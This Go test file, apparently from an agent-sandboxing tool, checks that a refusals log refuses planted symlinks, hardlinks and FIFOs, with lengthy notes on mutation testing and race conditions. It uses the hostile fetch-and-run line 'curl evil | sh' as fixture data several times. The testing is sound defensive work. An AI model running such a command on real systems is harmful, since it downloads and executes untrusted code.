//go:build posse_arm2

package posse

// ranger-base-legou: the host's own opens of the refusals trail go through
// no link and accept only a regular single-link file (refusalleaf.go). Each
// of the four uncaged sites is planted with each shape a planter outside a
// wall could leave at the leaf, and every case asserts three things: the
// call errors with errRefusalLeaf, the planted target is neither written nor
// created, and (for the fold) the cursor did not move.
//
// Mutants (MEASURED 2026-11-21, linux): dropping syscall.O_NOFOLLOW from
// openRefusalLeaf reds the symlink and dangling rows at every site; dropping
// the nlink check reds every hardlink row; dropping O_NONBLOCK reds every
// fifo row (by leafCallWithin's timeout below; the read of the planter's end
// has a bound again — ranger-base-4uiwo — but it is a bound on a STATE and
// never an answer, see leafReachedThePlanter); dropping the IsRegular check
// reds the
// spool-read fifo row and every row of the fifth plant — and before that
// plant existed it red the spool-read row ALONE, so the arm was live on the
// three WRITE sites and witnessed at none of them (ranger-base-q2peg; the
// plant's own comment has the reading). Dropping
// O_EXCL reds nothing, and that is expected: O_CREATE|O_NOFOLLOW over a
// dangling link is already ELOOP, so O_EXCL is the second wall, kept because
// it is PrepTouch's shape. A FIFO row that regresses would HANG rather than
// red (ORDERS.md, ranger-base-xab99), so every call runs under
// leafCallWithin, which opens the read end itself to release a blocked
// writer and then fails.

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"testing"
	"time"

	"golang.org/x/sys/unix"
)

const leafPrecious = "precious, not the trail's\n"

type leafPlant struct {
	name string
	// plant puts the shape at leaf and returns the path whose bytes must
	// not change ("" when there is none) and a path that must NOT come into
	// existence ("" when there is none).
	plant func(t *testing.T, leaf string) (keep, absent string)
}

func leafPlants() []leafPlant {
	return []leafPlant{
		{"symlink to a file", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(t.TempDir(), "rc")
			leafWrite(t, target, leafPrecious)
			if err := os.Symlink(target, leaf); err != nil {
				t.Fatal(err)
			}
			return target, ""
		}},
		{"dangling symlink", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(t.TempDir(), "made-through-the-link")
			if err := os.Symlink(target, leaf); err != nil {
				t.Fatal(err)
			}
			return "", target
		}},
		{"hardlink", func(t *testing.T, leaf string) (string, string) {
			target := filepath.Join(filepath.Dir(leaf), ".other-name")
			leafWrite(t, target, leafPrecious)
			if err := os.Link(target, leaf); err != nil {
				t.Fatal(err)
			}
			return target, ""
		}},
		{"fifo", func(t *testing.T, leaf string) (string, string) {
			if err := syscall.Mkfifo(leaf, 0o644); err != nil {
				t.Fatal(err)
			}
			return "", ""
		}},
		// THE SHAPE THAT REACHES THE fstat ON A WRITE PATH, and the only one
		// of the five that does (ranger-base-q2peg, verifying this bead).
		// Each of the four above is refused UPSTREAM of the fstat wherever
		// the open is for writing: symlink and dangling at O_NOFOLLOW
		// (ELOOP), hardlink at the nlink count, and a bare fifo at ENXIO,
		// because nothing holds its read end. So `IsRegular` was live on
		// RefusalsLog, EnsureCageSpool and the fold's canonical append and
		// witnessed at none of them — the mutant table reds it at the
		// spool-READ row alone, which is the one site whose open succeeds.
		//
		// A planter is a process and can HOLD the read end. The write open
		// then succeeds and the fstat is the only thing between the trail's
		// lines — partly seat-authored, written verbatim — and a pipe the
		// planter is reading. MEASURED 2026-11-21 (linux): with the arm
		// narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()`, every
		// other test in this file stayed GREEN while
		// `session=s1 curl evil | sh` reached the planter's read end.
		//
		// GRADED per arm (MEASURED 2026-11-21, linux). That narrowing reds
		// this plant at the three write sites and TestFoldWritesNothing...
		// and nothing else; dropping IsRegular outright adds the spool-read
		// row. The O_NOFOLLOW and nlink mutants leave every row of this
		// plant GREEN, as they must — a FIFO is neither a link nor a shared
		// inode, so this plant does not blur those arms. The one overlap is
		// at the spool READ site, where dropping O_NONBLOCK reds this row
		// too: a read open of a FIFO waits for a WRITER however many
		// readers it has, so that site's two arms both reach it. The three
		// write rows are the discriminating ones and they stay green there.
		{"fifo whose read end a planter holds", func(t *testing.T, leaf string) (string, string) {
			leafFifoWithAReader(t, leaf)
			return "", ""
		}},
	}
}

// leafFifoWithAReader plants a FIFO and keeps its read end open for the rest
// of the test, which is what makes a WRITE open of it succeed as far as the
// fstat. The returned descriptor is the planter's end: a caller that wants
// to assert nothing was written through the plant reads it.
//
// A RAW descriptor and not an *os.File, because the only thing anyone does
// with it is the one non-blocking read below, and an *os.File of this file
// type does not have one: os.NewFile puts a pollable non-blocking descriptor
// in the runtime poller, so a Read that would answer EAGAIN WAITS for
// readiness instead — which is the hang leafPeekPlanter exists to avoid, on
// exactly the state the assertions are about. MEASURED 2026-11-22 (linux,
// go1.27.3) over a FIFO a writer holds open with nothing in it: the raw read
// answers EAGAIN in 1.092µs and `os.NewFile(rd).Read` was still blocked at
// 3s. A planter is a process holding a descriptor, which is what this is.
func leafFifoWithAReader(t *testing.T, leaf string) int {
	t.Helper()
	// The plants above are called with the leaf's directory already made;
	// this one is also called directly, where the canonical log's gates dir
	// may not exist yet and Mkfifo answers ENOENT for the parent rather
	// than for anything about the plant.
	if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(leaf, 0o644); err != nil {
		t.Fatal(err)
	}
	// O_NONBLOCK so the read open does not wait for a writer, and because it
	// is what makes the read in leafPeekPlanter answerable without blocking.
	rd, err := unix.Open(leaf, unix.O_RDONLY|unix.O_NONBLOCK|unix.O_CLOEXEC, 0)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { unix.Close(rd) })
	return rd
}

// leafPipe is which of its three states a planter's pipe was in when it was
// read. A FIFO answers a non-blocking read with exactly these and no other
// (POSIX read(2): 0 when no process holds it for writing, EAGAIN when one
// does and there is nothing there, n > 0 otherwise), and they are three and
// not two because the middle one is the state this read CANNOT answer.
type leafPipe int

const (
	leafPipeBytes  leafPipe = iota // a writer put bytes there
	leafPipeClosed                 // no writer holds it and nothing is behind
	leafPipeOpen                   // a writer HOLDS it and nothing is there yet
)

func (s leafPipe) String() string {
	switch s {
	case leafPipeBytes:
		return "bytes"
	case leafPipeClosed:
		return "closed"
	case leafPipeOpen:
		return "held open and empty"
	}
	return fmt.Sprintf("leafPipe(%d)", int(s))
}

// leafPeekPlanter reads the planter's read end ONCE, without blocking, and
// says which state it found it in.
//
// ONE READ AND NOT A WAIT. The wait, where there is one, is
// leafReachedThePlanter's, and it is over the state this read cannot answer.
//
// THE BYTES need no wait, and that is a property of the callers rather than
// a shortcut: every caller asks after the call under test has RETURNED, and
// a pipe write is buffered, so whatever that call put in the pipe is already
// there.
//
// THE WRITER DOES, and the first version of this read said the opposite —
// "the only writer there could be has finished" (ranger-base-b8igm). It has
// not. Any goroutine in this process that forks between the guarded open and
// its close hands the child a DUPLICATE of that write descriptor, and
// O_CLOEXEC shuts it only AT execve, so for the child's whole fork-to-exec
// window the FIFO still has a writer — after the call under test closed its
// own and returned. That is execwrite.go's class with the pipe's writer
// count standing in for ETXTBSY, and it red the fold's row once inside a
// loaded full suite (ranger-base-4uiwo). MEASURED 2026-11-22 (linux 7.2.15
// x86_64, go1.27.3, 16 cores), 400 folds over a planted FIFO per arm, the
// peek taken exactly where the helper takes it:
//
//	fold alone                                      0/400 leafPipeOpen
//	fold + 8 goroutines looping exec /bin/true     57/400 leafPipeOpen
//	the same traffic, fold under syscall.ForkLock   0/400 leafPipeOpen
//
// All 57 cleared to leafPipeClosed on the very next read, worst 3.316µs, and
// no run of any arm ever put bytes in the pipe. docs/notes.d/ranger-base-4uiwo.md
// has the probe and why the ForkLock row is not the fix.
//
// What a wait must never add is an ANSWER: the bound this replaced
// (ranger-base-njj5z) returned "" after 500ms for leafPipeOpen, which is
// byte-identical to its answer for leafPipeClosed, so the one state it could
// not answer was folded into the one the assertions read as "the refusal
// held" — and nothing on any host ran that arm (ranger-base-72t07 graded all
// four arms of it: ranger-base-b8igm). The settle below answers for neither
// state: it re-reads until the pipe is in one that HAS an answer, and fatals
// if it never is.
//
// A raw unix.Read and not an *os.File read with a deadline, which was the
// bound BEFORE that one: a deadline on a FIFO is a runtime-POLLER fact and
// not a file fact. os/file_unix.go's newFile leaves a FIFO opened through
// OpenFile out of the netpoller on darwin and ios on purpose (Go issue
// #24164: closing the last writer raises no kqueue event there), so
// SetReadDeadline answers ErrNoDeadline there — MEASURED: macos arm 2 at
// 2a50bcb5 fatalled `file type does not support deadline` at 0.00s, having
// never read, while every ubuntu arm was green (ranger-base-njj5z, run
// 44990274146). O_NONBLOCK and read(2) over a FIFO are POSIX and are one
// answer on both hosts, and
// TestLeafReachedThePlanterReadsThePipesThreeStatesApart MEASURES all three
// of them on whichever host is running rather than asserting them.
//
// The state is meaningful only when the error is nil: an errno POSIX does
// not give a non-blocking read of a FIFO is a state this read does not know,
// and the error is what a caller reads for it.
func leafPeekPlanter(rd int) (string, leafPipe, error) {
	buf := make([]byte, 4096)
	n, err := unix.Read(rd, buf)
	switch {
	case n > 0:
		return string(buf[:n]), leafPipeBytes, nil
	case err == nil:
		return "", leafPipeClosed, nil
	case errors.Is(err, unix.EAGAIN):
		return "", leafPipeOpen, nil
	default:
		// Not a state, and the caller fatals on the error rather than
		// reading one: leafPipeOpen is returned because it is the answer
		// that asserts nothing.
		return "", leafPipeOpen, err
	}
}

// leafPlanterSettle bounds the wait below. It is a bound on a writer the
// call under test did NOT leave behind — a sibling fork's inherited
// duplicate, gone at the child's execve — and the two things it has to
// separate are four orders of magnitude apart: the worst fork-to-exec window
// measured here is 3.316µs (leafPeekPlanter's table above), and a descriptor
// a failed refusal really left open does not clear at all, so no value in
// between can be wrong about which one it saw. 10s is leafCallWithin's
// number, for the same reason it is that one's.
const leafPlanterSettle = 10 * time.Second

// leafReachedThePlanter is what arrived at the planter's read end, which is
// "" when the refusal held — the one reading the assertions in this file
// take, and it exists only for the two states that have one.
//
// leafPipeOpen is neither, so it is WAITED OUT and never answered for: the
// read is repeated until the pipe is in a state that has an answer, and a
// writer still there when leafPlanterSettle is up is the call under test
// having opened the leaf for writing and not closed it, which is the refusal
// having FAILED. Answering "" there is the vacuous green this helper was
// rewritten to refuse. Bytes win the moment they are in the pipe, because
// the loop reads before it looks at the state: a writer that holds the pipe
// AND put the trail in it reds with the trail, not with a timeout.
//
// WHY A WAIT AT ALL, when the version this replaces fataled on leafPipeOpen
// outright (ranger-base-b8igm). That fatal's message named the call under
// test as the holder, and the holder can be a sibling fork's duplicate of a
// descriptor that call already closed — the mechanism and the three measured
// arms are in leafPeekPlanter's comment. The claim was right about the state
// and wrong about whose it was, so it cost a red arm 2 inside a loaded full
// suite and a bead (ranger-base-4uiwo) over a fold that had refused
// correctly. After the settle the claim is sound; before it, it was not.
//
// SO ONE LINE HERE IS RUN BY NOTHING, said plainly because the bound this
// file replaced twice said the opposite of its own unrun arms: the settle's
// fatal, and leafPeekPlanter's `default` arm that feeds the fatal above it.
// MEASURED 2026-11-22, linux: a panic planted in that `default` arm is
// reached by no test in this file. A fatal nothing runs can only fail to
// fire, which is the direction the old timeout arm did NOT fail in — what it
// gave was an ANSWER, and the answer was the one the assertions read as "the
// refusal held". The WAIT is not in that company:
// TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause drives it, and
// TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds drives the arm that
// must not wait.
//
// EINTR is not retried, deliberately: with O_NONBLOCK the read never sleeps,
// so it has no interruption point to be restarted from, and a retry arm
// would be one more thing nothing runs. If it ever appears the fatal names
// it.
func leafReachedThePlanter(t *testing.T, rd int) string {
	t.Helper()
	deadline := time.Now().Add(leafPlanterSettle)
	for {
		got, state, err := leafPeekPlanter(rd)
		if err != nil {
			t.Fatalf("read of the planter's end: %v", err)
		}
		if state != leafPipeOpen {
			return got
		}
		if !time.Now().Before(deadline) {
			t.Fatalf("the planter's pipe is still %v after %v: a writer holds it and nothing is in it, which is the one state this read cannot answer, and nothing in this process forks for that long — the call under test opened the leaf for writing and left the descriptor open, so the refusal did not hold and there is no honest \"nothing arrived\" to report", state, leafPlanterSettle)
		}
		time.Sleep(200 * time.Microsecond)
	}
}

// The helper's OWN premise, measured on whatever host the suite is running
// on, in all three of the pipe's states. A read that cannot see bytes makes
// the assertion in TestFoldWritesNothingIntoAPlantersPipe a tautology, and
// nothing in the file this replaced said which hosts its premise held on —
// it held on linux, and on macos it was a t.Fatal at the bound rather than a
// vacuous green, which is the only reason the gap was visible at all
// (ranger-base-njj5z).
//
// THE THIRD STATE IS THE POINT, and it is why this pin is three readings and
// not two. `leafPipeOpen` is the state the old 500ms bound answered ""
// for — the same answer it gave for "the refusal held" — so the assertion it
// served was silent about it. This asserts the two are DISTINGUISHABLE here,
// which is the fact leafReachedThePlanter's settle and its fatal both rest
// on. The state is now put in deliberately by two tests rather than one —
// here and in TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause — and by
// this process's own fork traffic at no instant anyone chose
// (leafPeekPlanter, ranger-base-4uiwo).
//
// GRADED, arm by arm, apart from the assertion it serves (MEASURED
// 2026-11-22, linux, go1.27.3, the eleven tests of this file run together).
// A panic planted at the head of each of leafPeekPlanter's three ANSWER arms
// reds this pin and names it — bytes, closed and EAGAIN, all three, which is
// the whole of what the helper can answer. The two collapse mutants red this
// pin and ONE other test each, and the other test is the half of
// leafReachedThePlanter that arm feeds, which is the reading to want:
// turning the bytes arm's `return string(buf[:n])` into `return ""` reds
// this pin and TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds, and
// collapsing the EAGAIN arm to `return "", leafPipeClosed, nil` — what the
// bound this replaced did after 500ms — reds this pin and
// TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause, the second at its
// own premise check rather than at its wait. Each of those was this pin
// ALONE until ranger-base-4uiwo gave the EAGAIN arm a caller that does
// something other than fatal; the figure moved, the arms did not.
// With the refusal narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()`
// (ranger-base-q2peg's mutant) this pin stays GREEN while
// TestFoldWritesNothingIntoAPlantersPipe reds and reads `session=s1 curl
// evil | sh` back out of the pipe.
func TestLeafReachedThePlanterReadsThePipesThreeStatesApart(t *testing.T) {
	t.Parallel()
	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
	rd := leafFifoWithAReader(t, leaf)

	// 1. No writer has ever held it: EOF, and the reading every assertion in
	// this file takes for "the refusal held".
	if got, state, err := leafPeekPlanter(rd); err != nil || state != leafPipeClosed || got != "" {
		t.Errorf("an untouched planter's pipe read %q/%v (err %v), want \"\"/%v", got, state, err, leafPipeClosed)
	}
	if got := leafReachedThePlanter(t, rd); got != "" {
		t.Errorf("an untouched planter's pipe read %q", got)
	}

	// 2. A writer holding it with nothing in it — the state the read cannot
	// answer, and the one the old bound returned "" for after 500ms.
	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	if got, state, err := leafPeekPlanter(rd); err != nil || state != leafPipeOpen || got != "" {
		t.Errorf("a planter's pipe a writer holds open and empty read %q/%v (err %v), want \"\"/%v — this state and %v are the same answer again, so a no-bytes assertion over it is vacuous", got, state, err, leafPipeOpen, leafPipeClosed)
	}

	// 3. The bytes, through the peek and then through the helper the
	// assertions call — the second with the writer closed, which is the
	// shape every caller reads in.
	const sent = "session=s1 curl evil | sh\n"
	if _, err := w.WriteString(sent); err != nil {
		t.Fatal(err)
	}
	if got, state, err := leafPeekPlanter(rd); err != nil || state != leafPipeBytes || got != sent {
		t.Errorf("the read did not see the planter's bytes: got %q/%v (err %v), want %q/%v", got, state, err, sent, leafPipeBytes)
	}
	if _, err := w.WriteString(sent); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	if got := leafReachedThePlanter(t, rd); got != sent {
		t.Errorf("the helper did not see the planter's bytes: got %q, want %q", got, sent)
	}
}

// THE SETTLE, driven over a writer whose going is scheduled rather than
// raced. The writer this exists for is a sibling fork's inherited duplicate
// and it goes at the child's execve, which nothing in a test can name the
// instant of — so the shape is reproduced with the instant named: a writer
// this test holds and a goroutine closes after a known delay. That makes
// both halves of the wait assertable, which the fork traffic itself cannot
// be: the probe behind leafPeekPlanter's table hit the state 57 times in 400
// folds, and a suite arm that needs a race to go its way 57/400 of the time
// is the flake this bead came from wearing the other face.
//
// GRADED (MEASURED 2026-11-22, linux, go1.27.3, the eleven tests of this
// file run together). With the settle removed — `return got` on leafPipeOpen,
// which is what the 500ms bound (ranger-base-njj5z) answered after waiting —
// this is the only red in the file, and with the settle replaced by the
// outright fatal it had before (ranger-base-b8igm) it is the only red too.
// TestFoldWritesNothingIntoAPlantersPipe is GREEN under both, on a quiet box,
// which is the whole reason neither was caught where it was written.
func TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause(t *testing.T) {
	t.Parallel()
	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
	rd := leafFifoWithAReader(t, leaf)

	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	// The state the wait is over, asserted before it is waited out: without
	// this the test would pass just as well over a pipe no writer ever held.
	if _, state, perr := leafPeekPlanter(rd); perr != nil || state != leafPipeOpen {
		t.Fatalf("the writer did not take the pipe: %v (err %v), want %v", state, perr, leafPipeOpen)
	}

	const held = 50 * time.Millisecond
	go func() {
		time.Sleep(held)
		_ = w.Close()
	}()
	start := time.Now()
	got := leafReachedThePlanter(t, rd)
	took := time.Since(start)
	if got != "" {
		t.Errorf("a pipe no writer put bytes in read %q", got)
	}
	if took < held {
		t.Errorf("the helper answered %v in, before the writer went at %v — it did not wait the writer out, it answered for it", took, held)
	}
}

// The arm that must NOT wait. A writer that holds the pipe AND has put the
// trail in it is the failure this whole file exists to catch, and a settle
// that waited for the writer to GO rather than for an answer to exist would
// spend leafPlanterSettle and then fatal about a descriptor instead of
// printing the seat's bytes. The writer here is never closed before the call
// returns.
//
// GRADED (MEASURED 2026-11-22, linux): with the loop's exit narrowed to
// `state == leafPipeClosed`, so that the presence of a writer outranks the
// bytes already read, this reds at the settle's own 10s — the fatal naming a
// descriptor over a pipe that had the trail in it the whole time. It is NOT
// the only red of that mutant: the three-state pin's step 3 reds too, with
// `got ""`, because a pipe whose writer has already gone drains to
// leafPipeClosed and the mutant then answers the empty read rather than the
// bytes. Two witnesses and not one, which is why this test's own claim is
// the writer that never goes.
func TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds(t *testing.T) {
	t.Parallel()
	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
	rd := leafFifoWithAReader(t, leaf)

	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	defer w.Close()
	const sent = "session=s1 curl evil | sh\n"
	if _, err := w.WriteString(sent); err != nil {
		t.Fatal(err)
	}
	if got := leafReachedThePlanter(t, rd); got != sent {
		t.Errorf("the helper did not answer the planter's bytes while a writer still held the pipe: got %q, want %q", got, sent)
	}
}

// The plant above asserts the REFUSAL at all four sites; this asserts the
// thing a refusal is for, at the one site whose bytes are the seat's own.
// foldedLines writes `session=<s> <seat bytes>` verbatim and by design, so a
// canonical leaf the planter can read is a channel out of the trail — and
// the fold is the only writer that carries bytes the seat chose.
func TestFoldWritesNothingIntoAPlantersPipe(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
	leaf := a.RefusalsLogPath("p")
	if err := os.Remove(leaf); err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
	rd := leafFifoWithAReader(t, leaf)
	err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
	assertLeafRefused(t, err, "", "")
	if got := leafReachedThePlanter(t, rd); got != "" {
		t.Errorf("the fold wrote the trail into the planter's pipe: %q", got)
	}
	if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
		t.Errorf("a refused append must not advance the cursor (stat: %v)", serr)
	}
}

func leafWrite(t *testing.T, p, s string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

// leafCallWithin runs fn and returns its error, failing the test if it
// blocks: a write or read open of a FIFO with no peer blocks forever, and a
// hung pin is a 25-minute package timeout rather than a red.
func leafCallWithin(t *testing.T, leaf string, fn func() error) error {
	t.Helper()
	done := make(chan error, 1)
	go func() { done <- fn() }()
	select {
	case err := <-done:
		return err
	case <-time.After(10 * time.Second):
		// Release a blocked writer (read end) or reader (write end).
		if r, err := os.OpenFile(leaf, os.O_RDONLY|syscall.O_NONBLOCK, 0); err == nil {
			defer r.Close()
		}
		if w, err := os.OpenFile(leaf, os.O_WRONLY|syscall.O_NONBLOCK, 0); err == nil {
			defer w.Close()
		}
		t.Fatalf("%s: the call BLOCKED on the planted leaf — an open of it waited for a peer", leaf)
		return nil
	}
}

func assertLeafRefused(t *testing.T, err error, keep, absent string) {
	t.Helper()
	if !errors.Is(err, errRefusalLeaf) {
		t.Errorf("want a refusal wrapping %q, got %v", errRefusalLeaf, err)
	}
	if keep != "" {
		b, rerr := os.ReadFile(keep)
		if rerr != nil {
			t.Fatal(rerr)
		}
		if string(b) != leafPrecious {
			t.Errorf("the planted target %s was written through the leaf: %q", keep, b)
		}
	}
	if absent != "" {
		if _, serr := os.Lstat(absent); !os.IsNotExist(serr) {
			t.Errorf("the host created %s through a dangling link at the leaf (lstat: %v)", absent, serr)
		}
	}
}

func TestRefusalsLogRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.RefusalsLogPath("p")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { _, err := a.RefusalsLog("p"); return err })
			assertLeafRefused(t, err, keep, absent)
		})
	}
}

func TestEnsureCageSpoolRefusesAPlantedLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.CageSpoolPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { _, err := a.EnsureCageSpool("p", "s1"); return err })
			assertLeafRefused(t, err, keep, absent)
		})
	}
}

// The fold's append to the canonical log: the spool holds seat-authored
// lines, the canonical leaf is planted, and the fold must error, write
// nothing through the plant and leave no cursor behind.
func TestFoldRefusesAPlantedCanonicalLeafAndKeepsItsCursor(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
				t.Fatal(err)
			}
			leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
			leaf := a.RefusalsLogPath("p")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
				t.Errorf("a refused append must not advance the cursor (stat: %v)", serr)
			}
		})
	}
}

// The same, with the cursor already past a first fold: a refused append of
// NEW lines leaves the cursor exactly as it was, so the next fold over a
// repaired leaf still carries them.
func TestFoldRefusedAppendLeavesAnExistingCursorUnmoved(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	spool := a.CageSpoolPath("p", "s1")
	leafWrite(t, spool, "one\n")
	if err := a.FoldRefusalsSpool("p", "s1"); err != nil {
		t.Fatal(err)
	}
	before, err := os.ReadFile(a.spoolCursorPath("p", "s1"))
	if err != nil {
		t.Fatal(err)
	}
	leafWrite(t, spool, "one\ntwo\n")
	leaf := a.RefusalsLogPath("p")
	if err := os.Remove(leaf); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "rc")
	leafWrite(t, target, leafPrecious)
	if err := os.Symlink(target, leaf); err != nil {
		t.Fatal(err)
	}
	err = a.FoldRefusalsSpool("p", "s1")
	assertLeafRefused(t, err, target, "")
	after, rerr := os.ReadFile(a.spoolCursorPath("p", "s1"))
	if rerr != nil {
		t.Fatal(rerr)
	}
	if string(after) != string(before) {
		t.Errorf("cursor moved under a refused append:\nbefore %q\nafter  %q", before, after)
	}
}

// The fold's READ of the spool: a planted spool must not have its target's
// bytes copied into the canonical log.
func TestFoldRefusesAPlantedSpoolLeaf(t *testing.T) {
	t.Parallel()
	for _, pl := range leafPlants() {
		t.Run(pl.name, func(t *testing.T) {
			t.Parallel()
			a := cageApp(t)
			leaf := a.CageSpoolPath("p", "s1")
			if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
				t.Fatal(err)
			}
			keep, absent := pl.plant(t, leaf)
			err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
			assertLeafRefused(t, err, keep, absent)
			if b, rerr := os.ReadFile(a.RefusalsLogPath("p")); rerr == nil && len(b) > 0 {
				t.Errorf("a refused spool's bytes reached the canonical log: %q", b)
			}
			if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
				t.Errorf("a refused spool read must not write a cursor (stat: %v)", serr)
			}
		})
	}
}

// RenderEgress is the container launch's call into RefusalsLog: a planted
// canonical leaf must fail the render, so the proxy is never handed a mount
// of the link's target.
func TestRenderEgressFailsOverAPlantedRefusalsLeaf(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	rt, err := a.LoadRuntime("claude")
	if err != nil {
		t.Fatal(err)
	}
	ag := cageAgent(t, a, "cage: container\negress: [localhost]\n")
	hosts, _ := EgressHosts(ag, rt)
	leaf := a.RefusalsLogPath(ag.Name)
	if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(t.TempDir(), "made-through-the-link")
	if err := os.Symlink(target, leaf); err != nil {
		t.Fatal(err)
	}
	_, _, log, err := a.RenderEgress(ag, rt, "s1", hosts)
	assertLeafRefused(t, err, "", target)
	if log != "" {
		t.Errorf("a refused render must return no log path to mount, got %q", log)
	}
}

// The ordinary shapes still work: an absent leaf is created 0644 regular,
// and a regular one is appended to.
func TestRefusalLeafAcceptsAbsentAndRegular(t *testing.T) {
	t.Parallel()
	a := cageApp(t)
	p, err := a.RefusalsLog("p")
	if err != nil {
		t.Fatal(err)
	}
	fi, err := os.Lstat(p)
	if err != nil || !fi.Mode().IsRegular() {
		t.Fatalf("RefusalsLog over an absent leaf must create a regular file: %v %v", fi, err)
	}
	if _, err := a.RefusalsLog("p"); err != nil {
		t.Fatalf("RefusalsLog over its own regular file: %v", err)
	}
	if err := a.appendCanonicalRefusal("p", "x\n"); err != nil {
		t.Fatal(err)
	}
	if err := a.appendCanonicalRefusal("p", "y\n"); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(p)
	if string(b) != "x\ny\n" {
		t.Errorf("appends: %q", b)
	}
}
